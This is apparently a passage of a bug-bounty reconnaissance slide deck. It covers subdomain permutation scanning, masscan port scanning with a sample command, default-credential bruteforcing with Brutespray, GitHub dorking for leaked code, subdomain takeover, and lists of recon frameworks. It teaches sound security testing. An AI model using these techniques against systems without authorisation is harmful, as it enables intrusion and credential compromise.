relatively the same nowadays, but the 1st 
team to really iterate on this is the AssetNote 
team with their commonspeak data collection. 
The all.txt ﬁle includes commonspeak v1 data 
but there is also a second version of 
commonspeak data out:
●
https://github.com/assetnote/commonspeak2 
Alteration Scanning
When bruteforcing or gathering subdomains via 
scraping you may come across a naming pattern in 
these subdomains. 
Even though you may not have found it yet, there 
may be other targets that conform to naming 
conventions. 
In addition, sometimes targets are not explicitly 
protected across naming conventions. 
The ﬁrst tool to attempt to recognize these patterns 
and bruteforce for some of them was altdns written 
by Naﬀy and Shubs.
Now amass contains logic to check for these 
“permutations”. Amass includes this analysis in a 
default run Some personal experience cited on the 
next page.
dev.company.com
dev1.company.com
dev2.company.com
dev-1.company.com
Dev-2.company.com
Dev.1.company.com
Dev.2.company.com
Alteration Scanning (WAF Bypass)
Other
Port Analysis (masscan)
Most hacker education would have you use nmap 
here, but masscan by Robert Graham is much faster for 
general “ﬁnding-open-ports-on-TCP”. Chaining 
masscan’s output to then be nmap’ed can save a lot of 
time. 
Masscan achieves this speed with a re-written TCP/IP 
stack, true multi-threading, and is written in C. 
Sample syntax for scanning a list of IPs:
●
masscan -p1-65535 -iL $ipFile --max-rate 1800 
-oG $outPutFile.log
A full syntax guide of masscan (authored by Daniel 
Miessler) can be found here: 
https://danielmiessler.com/study/masscan/
Port Analysis 
(dnmasscan)
One limitation of masscan 
is that it only scans IP 
addresses. Y
ou can write you own 
simple converter script or 
you can use something 
like dnmasscan by 
@rastating
Service Scanning (brutespray)
When we get this service/port 
information we can feed it to nmap 
to get a OG outputﬁle.
We can then scan the remote 
administration protocols for default 
passwords with a tool called 
Burtespray by @x90skysn3k which 
takes the nmap OG ﬁle format.
masscan
Brutespray 
credential 
bruteforce
Nmap 
service 
scan -oG
Github Dorking (manual)
Many organizations quickly grow in their engineering teams.  
Sooner or later a new developer, intern, contractor, or other staﬀ 
will leak source code online, usually through a public Github.com 
repo that they mistakenly thought they had set private.
Enjoy my quick github dork collection:
●
https://gist.github.com/jhaddix/1fb7ab2409ab579178d2a799599
09b33
** Helps if your console supports clickable hyperlinks
The repo mentioned earlier by Gwendal Le Coguic called “github- 
search” has some automated github tools for this as well. 
Also check out @th3g3ntelman’s full module on Github and 
Sensitive data Exposure.
Screenshotting (Eyewitness, Aquatone, httpscreenshot)
At this point we have a lot of attack surface. 
We can feed possible domains to a tool 
and attempt to screenshot the results. This 
will allow us to “eye-ball” things that might 
be interesting. 
There are many tools for this. Aquatone is a 
wider recon framework that does this, 
HTTPscreenshot, and Eyewitness. I use 
Eyewitness because it will prepend both 
the http and https protocol for each domain 
we have observed.  I’m not highly tied to 
this tool though, ﬁnd one that works for 
you. 
Subdomain takeover (can i take over xyz)
“Subdomain takeover vulnerabilities occur 
when a subdomain (subdomain.example.com) 
is pointing to a service (e.g. GitHub pages, 
Heroku, etc.) that has been removed or 
deleted. This allows an attacker to set up a 
page on the service that was being used and 
point their page to that subdomain. For 
example, if subdomain.example.com was 
pointing to a GitHub page and the user decided 
to delete their GitHub page, an attacker can 
now create a GitHub page, add a CNAME ﬁle 
containing subdomain.example.com, and claim 
subdomain.example.com.”
A great resource for subdomain takover is Ed 
Overlow’s repo can-i-take-over-xyz
Subdomain takeover 
(SubOver & nuclei)
To ﬁnd subdomain takeovers we can use a few tools. 
SubOver is a discontinued stand alone tool by 
Ice3man and has since been incorporated to Project 
Discovery’s nuclei scanner. 
Nuclei is part of a larger scanning framework but 
boasts the most takeover checks of any tool i’ve 
seen.
Automation++
Extending tools (interlace)
Eventually you will want to make script or recon framework of you 
own. Quickly you will come up against some problems:
●
Not all tools extend to take diﬀerent sources of input 
●
Some lack threading. 
●
Not all can be distributed
You can rewrite a tool yourself to handle these issues but some 
help does exist here. 
Interlace by Michael Skelton aka Codingo is an awesome tool than 
help glue together a recon framework.
Interlace can take these tools and add support for: CIDR input, 
Glob input, threading, proxying, queued commands, and more.
Hakluke wrote a great guide on it here.
Extending tools (anything TomNomNom writes)
Tomnomnom has an extensive repo of tools which are awesome. I highly suggest you check them all out.
Frameworks 
It could be recon is not really your thing. That’s all right. 
Several hunters have open sourced their automation at this point and you can choose one that ﬁts you 
and use it without worrying too much. I usually classify recon frameworks in rough tiers:
C-Tier: automation built around scripting up other tools in bash or python. Step based, no workﬂow. 
Few techniques. Little extensibility.
B-Tier: automation writing a few of their own modules. Some GUI or advanced workﬂow. Medium 
techniques. Runs point-in-time. Flat ﬁles. 
A-Tier: automation writing all their own modules. Has GUI. Runs iterativley. Manages data via db.
S-Tier: automation writing their own modules. Has GUI. Runs iterativley. Manages data via db. Scales 
across multiple boxes. Sends alerts to user. Uses novel techniques and iterates quickly. ML + AI.
Frameworks (C-Tier) 
https://github.com/AdmiralGaust/bountyRecon
https://github.com/offhourscoding/recon
https://github.com/Sambal0x/Recon-tools
https://github.com/JoshuaMart/AutoRecon
https://github.com/yourbuddy25/Hunter
https://github.com/venom26/recon/blob/master/ultimat
e_recon.sh
https://gist.github.com/dwisiswant0/5f647e3d406b5e9
84e6d69d3538968cd
ultimate_recon.sh
Frameworks 
(B-Tier) 
https://github.com/capt-meelo/LazyRecon
https://github.com/Screetsec/Sudomy
https://github.com/phspade/Automated-Sca
nner
https://github.com/devanshbatham/G
orecon
https://github.com/shmilylty/OneForAll
https://github.com/LordNeoStark/tuga
recon
https://github.com/SolomonSklash/chomp-s
can
https://github.com/TypeError/domained
LazyRecon
(A-Tier) 
https://github.com/Edu4rdSHL/findomain
https://github.com/SilverPoision/Rock-ON
https://github.com/epi052/recon-pipeline
Frameworks (S-Tier) 
Intrigue.io
AssetNote
Frameworks (S-Tier) 
Project Discovery Framework 
(unreleased)
Spiderfoot
